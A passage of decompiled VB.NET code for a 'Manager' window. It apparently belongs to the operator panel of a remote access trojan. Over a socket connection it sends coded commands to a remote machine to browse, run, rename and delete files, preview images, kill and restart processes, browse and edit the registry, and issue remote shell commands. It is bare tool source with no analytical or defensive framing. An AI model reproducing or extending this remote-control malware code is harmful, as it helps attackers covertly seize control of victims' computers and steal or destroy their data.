		' (get) Token: 0x0600037D RID: 893 RVA: 0x0001FF94 File Offset: 0x0001E194
		' (set) Token: 0x0600037E RID: 894 RVA: 0x00002A44 File Offset: 0x00000C44
		Friend Overridable Property ColumnHeader11 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader11
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader11 = value
			End Set
		End Property

		' Token: 0x1700015C RID: 348
		' (get) Token: 0x0600037F RID: 895 RVA: 0x0001FFAC File Offset: 0x0001E1AC
		' (set) Token: 0x06000380 RID: 896 RVA: 0x00002A4D File Offset: 0x00000C4D
		Friend Overridable Property ColumnHeader12 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader12
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader12 = value
			End Set
		End Property

		' Token: 0x1700015D RID: 349
		' (get) Token: 0x06000381 RID: 897 RVA: 0x0001FFC4 File Offset: 0x0001E1C4
		' (set) Token: 0x06000382 RID: 898 RVA: 0x00002A56 File Offset: 0x00000C56
		Friend Overridable Property ColumnHeader13 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader13
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader13 = value
			End Set
		End Property

		' Token: 0x1700015E RID: 350
		' (get) Token: 0x06000383 RID: 899 RVA: 0x0001FFDC File Offset: 0x0001E1DC
		' (set) Token: 0x06000384 RID: 900 RVA: 0x00002A5F File Offset: 0x00000C5F
		Friend Overridable Property ColumnHeader14 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader14
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader14 = value
			End Set
		End Property

		' Token: 0x1700015F RID: 351
		' (get) Token: 0x06000385 RID: 901 RVA: 0x0001FFF4 File Offset: 0x0001E1F4
		' (set) Token: 0x06000386 RID: 902 RVA: 0x00002A68 File Offset: 0x00000C68
		Friend Overridable Property ColumnHeader15 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader15
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader15 = value
			End Set
		End Property

		' Token: 0x17000160 RID: 352
		' (get) Token: 0x06000387 RID: 903 RVA: 0x0002000C File Offset: 0x0001E20C
		' (set) Token: 0x06000388 RID: 904 RVA: 0x00002A71 File Offset: 0x00000C71
		Friend Overridable Property vmethod_108 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_108
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._vmethod_108 = value
			End Set
		End Property

		' Token: 0x06000389 RID: 905 RVA: 0x00020024 File Offset: 0x0001E224
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Manager_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Manager_Load
			AddHandler MyBase.Resize, AddressOf Me.Manager_Resize
			Manager.__ENCAddToList(Me)
			Me.RGCH = New Collection()
			Me.string_0 = String.Empty
			Me.Images = New Collection()
			Me.Cache = New Collection()
			Me.isCut = False
			Me.Flist = String.Empty
			Me.TCPFX = True
			Me.PRFX = True
			Me.SrvFX = True
			Me.srvNxt = True
			Me.PID = 0
			Me.PRNXT = True
			Me.TCPNXT = True
			Me.string_1 = New String(4) {}
			Me.int_0 = 0
			Me.int_1 = 0
			Me.cur = Manager.CR.fm
			Me.shStarted = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600038A RID: 906 RVA: 0x00020114 File Offset: 0x0001E314
		Public Sub exp(x As String, Optional Refresh As Boolean = False)
			Try
				Dim text As String = x.Replace("\\", "\")
				If Not text.EndsWith("\") Then
					text += "\"
				End If
				Me.TextBox1.Text = text
				Dim pr As ToolStripProgressBar = Me.pr
				Dim obj As ToolStripProgressBar = pr
				SyncLock obj
					Me.p.Image = Nothing
					Me.p.Visible = False
					Me.TextBox1.BackColor = Color.IndianRed
					If Refresh AndAlso Me.Cache.Contains(text) Then
						Me.Cache.Remove(text)
					End If
					If Me.Cache.Contains(text) Then
						Me.TextBox1.BackColor = Color.Pink
						Dim gclass As Manager.GClass14 = CType(Me.Cache(text), Manager.GClass14)
						Me.pr.Value = 0
						Me.pr.Maximum = gclass.list_1.Count + gclass.list_0.Count
						Me.L2.Items.Clear()
						If New DirectoryInfo(text).Parent IsNot Nothing Then
							Dim listViewItem As ListViewItem = Me.L2.Items.Add("..", "..", 0)
							listViewItem.SubItems.Add(String.Empty)
							listViewItem.SubItems.Add("DIR")
							listViewItem.ToolTipText = New DirectoryInfo(text).Parent.FullName + "\"
						End If
						Try
							For Each text2 As String In gclass.list_0
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar As ToolStripProgressBar = pr2
								toolStripProgressBar.Value += 1
								Dim listViewItem2 As ListViewItem = Me.L2.Items.Add(text2, New DirectoryInfo(text2).Name, 0)
								listViewItem2.SubItems.Add(String.Empty)
								listViewItem2.SubItems.Add("DIR")
								listViewItem2.ToolTipText = text2
							Next
						Finally
							Dim enumerator As List(Of String).Enumerator
							CType(enumerator, IDisposable).Dispose()
						End Try
						Dim list As List(Of ListViewItem) = New List(Of ListViewItem)()
						Try
							For Each expression As String In gclass.list_1
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar As ToolStripProgressBar = pr2
								toolStripProgressBar.Value += 1
								Dim array As String() = Strings.Split(expression, "*", -1, CompareMethod.Binary)
								Dim fileInfo As FileInfo = New FileInfo(array(0))
								Dim listViewItem3 As ListViewItem = New ListViewItem(fileInfo.Name, 1)
								Dim listViewItem4 As ListViewItem = listViewItem3
								listViewItem4.ToolTipText = fileInfo.FullName
								listViewItem4.SubItems.Add(array(1))
								listViewItem4.SubItems.Add(array(2))
								listViewItem4.Name = listViewItem4.ToolTipText
								If Not Me.Images.Contains("!" + listViewItem4.ToolTipText) Then
									GoTo IL_3D1
								End If
								Try
									If Not Me.vmethod_108.Images.ContainsKey(listViewItem4.ToolTipText) Then
										Dim array2 As Object() = New Object(1) {}
										Dim listViewItem5 As ListViewItem = listViewItem4
										array2(0) = listViewItem5.ToolTipText
										array2(1) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.Images(listViewItem4.ToolTipText))))
										Dim array3 As Object() = array2
										Dim array4 As Boolean() = New Boolean() { True, False }
										NewLateBinding.LateCall(Me.vmethod_108.Images, Nothing, "Add", array3, Nothing, Nothing, array4, True)
										If array4(0) Then
											listViewItem5.ToolTipText = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3(0)))), GetType(String)))
										End If
									End If
									GoTo IL_4CB
								Catch ex As Exception
									GoTo IL_4CB
								End Try
								GoTo IL_3D1
								IL_4CB:
								listViewItem4.ImageKey = listViewItem4.ToolTipText
								IL_48C:
								listViewItem4 = Nothing
								list.Add(listViewItem3)
								If list.Count > 20 Then
									Me.L2.Items.AddRange(list.ToArray())
									list.Clear()
									Continue For
								End If
								Continue For
								IL_3D1:
								If fileInfo.Extension.Length <= 0 Then
									GoTo IL_48C
								End If
								If Not Me.vmethod_108.Images.ContainsKey(fileInfo.Extension) Then
									File.Create(Application.StartupPath + "\!" + fileInfo.Extension).Close()
									Me.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\!" + fileInfo.Extension))
									File.Delete(Application.StartupPath + "\!" + fileInfo.Extension)
									listViewItem4.ImageKey = fileInfo.Extension
									GoTo IL_48C
								End If
								listViewItem4.ImageKey = fileInfo.Extension
								GoTo IL_48C
							Next
						Finally
							Dim enumerator2 As List(Of String).Enumerator
							CType(enumerator2, IDisposable).Dispose()
						End Try
						If list.Count > 0 Then
							Me.L2.Items.AddRange(list.ToArray())
							list.Clear()
						End If
						Me.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
						Me.pr.Value = 0
					Else
						Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
					End If
				End SyncLock
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600038B RID: 907 RVA: 0x00020744 File Offset: 0x0001E944
		Private Sub Manager_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Me.Images.Clear()
			Catch ex As Exception
			End Try
			Try
				Me.Cache.Clear()
			Catch ex2 As Exception
			End Try
			If Me.sk IsNot Nothing AndAlso Me.sk.CN Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "@" }))
			End If
		End Sub

		' Token: 0x0600038C RID: 908 RVA: 0x000207FC File Offset: 0x0001E9FC
		Private Sub Manager_Load(sender As Object, e As EventArgs)
			Try
				Me.LPR.Tag = Nothing
				Me.LTCP.Tag = Nothing
				Me.RGk.Nodes.Add("HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT")
				Me.RGk.Nodes.Add("HKEY_CURRENT_USER", "HKEY_CURRENT_USER")
				Me.RGk.Nodes.Add("HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE")
				Me.RGk.Nodes.Add("HKEY_USERS", "HKEY_USERS")
				Me.L2.Controls.Add(Me.p)
				Me.ListView1.Items(0).Selected = True
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "~" }))
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
				Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.sk.L)))
				Me.L2.Controls.Add(Me.p)
				Me.p.Visible = False
				Try
					Me.string_0 = Me.sk.Folder + "Downloads\"
				Catch ex As Exception
				End Try
				Me.vmethod_26.Enabled = True
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600038D RID: 909 RVA: 0x000209FC File Offset: 0x0001EBFC
		Private Sub Manager_Resize(sender As Object, e As EventArgs)
			Me.p.Left = Me.L2.Width - Me.p.Width - 25
			Me.p.Top = Me.L2.Height - Me.p.Height - 25
		End Sub

		' Token: 0x0600038E RID: 910 RVA: 0x00020A54 File Offset: 0x0001EC54
		Private Sub KillToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = text + Class7.string_1 + listViewItem.SubItems(1).Text
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If text.Length > 0 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "k", text }))
			End If
		End Sub

		' Token: 0x0600038F RID: 911 RVA: 0x00020B24 File Offset: 0x0001ED24
		Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText })
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If text.Length > 0 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "kd", text }))
			End If
		End Sub

		' Token: 0x06000390 RID: 912 RVA: 0x00020C18 File Offset: 0x0001EE18
		Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			If Me.TextBox1.Text.Length > 0 Then
				Me.exp(Me.TextBox1.Text, True)
			End If
		End Sub

		' Token: 0x06000391 RID: 913 RVA: 0x00002A7A File Offset: 0x00000C7A
		Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
		End Sub

		' Token: 0x06000392 RID: 914 RVA: 0x00020C4C File Offset: 0x0001EE4C
		Private Sub RGLIST_DoubleClick(sender As Object, e As EventArgs)
			If Me.RGLIST.SelectedItems.Count <> 0 Then
				Dim listViewItem As ListViewItem = Me.RGLIST.SelectedItems(0)
				Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
				rgv.TextBox1.Text = listViewItem.Text
				rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf(listViewItem.SubItems(1).Text)
				Try
					rgv.TextBox3.Text = listViewItem.SubItems(2).Text
				Catch ex As Exception
				End Try
				rgv.Text = rgv.Path
				rgv.TextBox1.[ReadOnly] = True
				rgv.ShowDialog(Me)
			End If
		End Sub

		' Token: 0x06000393 RID: 915 RVA: 0x00020D54 File Offset: 0x0001EF54
		Private Sub NewValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
			rgv.TextBox1.Text = "Name"
			rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf("String")
			rgv.TextBox3.Text = "Value"
			rgv.Text = rgv.Path
			rgv.ShowDialog(Me)
		End Sub

		' Token: 0x06000394 RID: 916 RVA: 0x00020DEC File Offset: 0x0001EFEC
		Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count > 0 Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "dl" })
				Try
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim objectValue As Object = RuntimeHelpers.GetObjectValue(obj)
							Dim listViewItem As ListViewItem = CType(objectValue, ListViewItem)
							If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
								If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
									Dim str As String = text
									Dim str2 As String = Class7.string_1
									Dim text2 As String = listViewItem.ToolTipText + "*!"
									text = str + str2 + Class6.smethod_14(text2)
								Else
									Dim str3 As String = text
									Dim str4 As String = Class7.string_1
									Dim text3 As String = listViewItem.ToolTipText + "*"
									text = str3 + str4 + Class6.smethod_14(text3)
								End If
							End If
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				Finally
					Dim enumerator2 As IEnumerator
					If TypeOf enumerator2 Is IDisposable Then
						TryCast(enumerator2, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x06000395 RID: 917 RVA: 0x00020F7C File Offset: 0x0001F17C
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim keyCode As Keys = e.KeyCode
			If keyCode = Keys.[Return] Then
				Dim text As String = Me.T2.Text
				Me.T2.Text = String.Empty
				e.SuppressKeyPress = True
				Me.string_1(Me.int_1) = text
				Me.int_1 += 1
				If Me.int_1 > Me.string_1.Length - 1 Then
					Me.int_1 = 0
				End If
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
			ElseIf keyCode = Keys.Down Then
				Me.int_0 += -1
				If Me.int_0 < 0 Then
					Me.int_0 = 0
				End If
				Me.T2.Text = Me.string_1(Me.int_0)
			ElseIf keyCode = Keys.Up Then
				Me.int_0 += 1
				If Me.int_0 > Me.string_1.Length - 1 Then
					Me.int_0 = Me.string_1.Length - 1
				End If
				Me.T2.Text = Me.string_1(Me.int_0)
			End If
		End Sub

		' Token: 0x06000396 RID: 918 RVA: 0x00002A93 File Offset: 0x00000C93
		Private Sub sh_Resize(sender As Object, e As EventArgs)
			Me.T1.ScrollToCaret()
		End Sub

		' Token: 0x06000397 RID: 919 RVA: 0x000210E0 File Offset: 0x0001F2E0
		Private Sub RGk_AfterCollapse(sender As Object, e As TreeViewEventArgs)
			Dim gclass As Manager.GClass13
			If Me.RGCH.Contains(e.Node.FullPath + "\") Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			If gclass Is Nothing Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			ElseIf gclass.list_0.Count = 0 And gclass.list_1.Count = 0 Then
				Me.RGLIST.Items.Clear()
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Me.RGLIST.Items.Clear()
				Try
					For Each array As String() In gclass.list_0
						Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
						listViewItem.SubItems.Add(array(1))
						listViewItem.SubItems.Add(array(2))
						If Operators.CompareString(array(1), "String", False) = 0 Then
							listViewItem.ImageIndex = 1
						Else
							listViewItem.ImageIndex = 2
						End If
					Next
				Finally
					Dim enumerator As List(Of String()).Enumerator
					CType(enumerator, IDisposable).Dispose()
				End Try
				Me.RGLIST.method_3()
			End If
		End Sub

		' Token: 0x06000398 RID: 920 RVA: 0x000210E0 File Offset: 0x0001F2E0
		Private Sub RGk_AfterExpand(sender As Object, e As TreeViewEventArgs)
			Dim gclass As Manager.GClass13
			If Me.RGCH.Contains(e.Node.FullPath + "\") Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			If gclass Is Nothing Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			ElseIf gclass.list_0.Count = 0 And gclass.list_1.Count = 0 Then
				Me.RGLIST.Items.Clear()
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Me.RGLIST.Items.Clear()
				Try
					For Each array As String() In gclass.list_0
						Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
						listViewItem.SubItems.Add(array(1))
						listViewItem.SubItems.Add(array(2))
						If Operators.CompareString(array(1), "String", False) = 0 Then
							listViewItem.ImageIndex = 1
						Else
							listViewItem.ImageIndex = 2
						End If
					Next
				Finally
					Dim enumerator As List(Of String()).Enumerator
					CType(enumerator, IDisposable).Dispose()
				End Try
				Me.RGLIST.method_3()
			End If
		End Sub

		' Token: 0x06000399 RID: 921 RVA: 0x00021300 File Offset: 0x0001F500
		Private Sub RGk_AfterSelect(sender As Object, e As TreeViewEventArgs)
			Dim gclass As Manager.GClass13
			If Me.RGCH.Contains(e.Node.FullPath + "\") Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			If gclass Is Nothing Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			ElseIf gclass.list_0.Count = 0 And gclass.list_1.Count = 0 Then
				Me.RGLIST.Items.Clear()
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Me.RGLIST.Items.Clear()
				Try
					For Each array As String() In gclass.list_0
						Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
						listViewItem.SubItems.Add(array(1))
						listViewItem.SubItems.Add(array(2))
						If Operators.CompareString(array(1), "String", False) = 0 Then
							listViewItem.ImageIndex = 1
						Else
							listViewItem.ImageIndex = 2
						End If
					Next
				Finally
					Dim enumerator As List(Of String()).Enumerator
					CType(enumerator, IDisposable).Dispose()
				End Try
				Me.RGLIST.method_3()
				If Not e.Node.IsExpanded Then
					e.Node.Expand()
				End If
			End If
		End Sub

		' Token: 0x0600039A RID: 922 RVA: 0x0002153C File Offset: 0x0001F73C
		Private Sub RestartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText, "::", listViewItem.SubItems(4).Text })
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If text.Length > 0 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "re", text }))
			End If
		End Sub

		' Token: 0x0600039B RID: 923 RVA: 0x0002164C File Offset: 0x0001F84C
		Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.RGk.SelectedNode IsNot Nothing Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x0600039C RID: 924 RVA: 0x000216E8 File Offset: 0x0001F8E8
		Private Sub L2_DoubleClick(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count <> 0 Then
				If Operators.CompareString(Me.L2.SelectedItems(0).SubItems(2).Text, "DIR", False) = 0 Then
					Me.exp(Me.L2.SelectedItems(0).ToolTipText, False)
				Else
					Dim array As String() = New String(6) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "rd"
					array(5) = Class7.string_1
					Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
					Dim toolTipText As String = listViewItem.ToolTipText
					listViewItem.ToolTipText = toolTipText
					array(6) = Class6.smethod_14(toolTipText)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x0600039D RID: 925 RVA: 0x000217D4 File Offset: 0x0001F9D4
		Private Sub L2_SelectedIndexChanged(sender As Object, e As EventArgs)
			Me.p.Image = Nothing
			Me.p.Visible = False
			If Me.L2.SelectedItems.Count = 1 Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				If Me.Images.Contains(listViewItem.ToolTipText) Then
					Me.p.Image = CType(Me.Images(listViewItem.ToolTipText), Image)
					Me.p.Visible = True
				ElseIf listViewItem.SubItems(2).Text.Length > 0 AndAlso ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems(2).Text.ToLower()) Then
					Dim array As String() = New String(10) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "#"
					array(5) = Class7.string_1
					Dim listViewItem2 As ListViewItem = listViewItem
					Dim toolTipText As String = listViewItem2.ToolTipText
					listViewItem2.ToolTipText = toolTipText
					array(6) = Class6.smethod_14(toolTipText)
					array(7) = Class7.string_1
					array(8) = Conversions.ToString(Me.p.Width)
					array(9) = Class7.string_1
					array(10) = Conversions.ToString(Me.p.Height)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x0600039E RID: 926 RVA: 0x00021948 File Offset: 0x0001FB48
		Private Sub UPToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.Items.ContainsKey("..") Then
				Me.exp(Me.L2.Items("..").ToolTipText, False)
			End If
		End Sub

		' Token: 0x0600039F RID: 927 RVA: 0x00021990 File Offset: 0x0001FB90
		Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L2.SelectedItems.Count > 0 Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rn" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						Dim toolTipText As String = listViewItem.ToolTipText
						listViewItem.ToolTipText = toolTipText
						text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x060003A0 RID: 928 RVA: 0x00021A70 File Offset: 0x0001FC70
		Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L2.SelectedItems.Count > 0 Then
					Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "dl", Class7.string_1 })
					Try
						Try
							For Each obj As Object In Me.L2.SelectedItems
								Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
								If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
									If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
										Dim str As String = text
										Dim str2 As String = Class7.string_1
										Dim text2 As String = listViewItem.ToolTipText + "*!"
										Dim str3 As String = Class6.smethod_14(text2)
										text = str + str2 + str3
									Else
										Dim str4 As String = text
										Dim str5 As String = Class7.string_1
										Dim text3 As String = listViewItem.ToolTipText + "*"
										Dim str6 As String = Class6.smethod_14(text3)
										text = str4 + str5 + str6
									End If
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
					Finally
						Dim enumerator2 As IEnumerator
						If TypeOf enumerator2 Is IDisposable Then
							TryCast(enumerator2, IDisposable).Dispose()
						End If
					End Try
					Me.sk.Send(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003A1 RID: 929 RVA: 0x00021C54 File Offset: 0x0001FE54
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
						If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0 Then
							Dim text As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							If text.Length > 0 Then
								Dim client As Client = Me.sk
								Dim array As String() = New String(6) {}
								array(0) = "Ex"
								array(1) = Class7.string_1
								array(2) = "fm"
								array(3) = Class7.string_1
								array(4) = "nm"
								array(5) = Class7.string_1
								Dim array2 As String() = array
								Dim num As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text + "*!"
								array2(num) = Class6.smethod_14(text2)
								client.Send(String.Concat(array))
							End If
						Else
							Dim text3 As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							If text3.Length > 0 Then
								Dim client2 As Client = Me.sk
								Dim array As String() = New String(6) {}
								array(0) = "Ex"
								array(1) = Class7.string_1
								array(2) = "fm"
								array(3) = Class7.string_1
								array(4) = "nm"
								array(5) = Class7.string_1
								Dim array3 As String() = array
								Dim num2 As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text3 + "*"
								array3(num2) = Class6.smethod_14(text2)
								client2.Send(String.Concat(array))
							End If
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060003A2 RID: 930 RVA: 0x00002AA0 File Offset: 0x00000CA0
		Private Sub SL_Click(sender As Object, e As EventArgs)
			Me.SL.Text = String.Empty
		End Sub

		' Token: 0x060003A3 RID: 931 RVA: 0x00021E3C File Offset: 0x0002003C
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
						If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0 Then
							text = text + "*" + listViewItem.ToolTipText
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			If Operators.CompareString(text, String.Empty, False) <> 0 Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = False
			End If
		End Sub

		' Token: 0x060003A4 RID: 932 RVA: 0x00021F10 File Offset: 0x00020110
		Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.Text, "..", False) <> 0 Then
						If Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0 Then
							text = text + "*" + listViewItem.ToolTipText
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
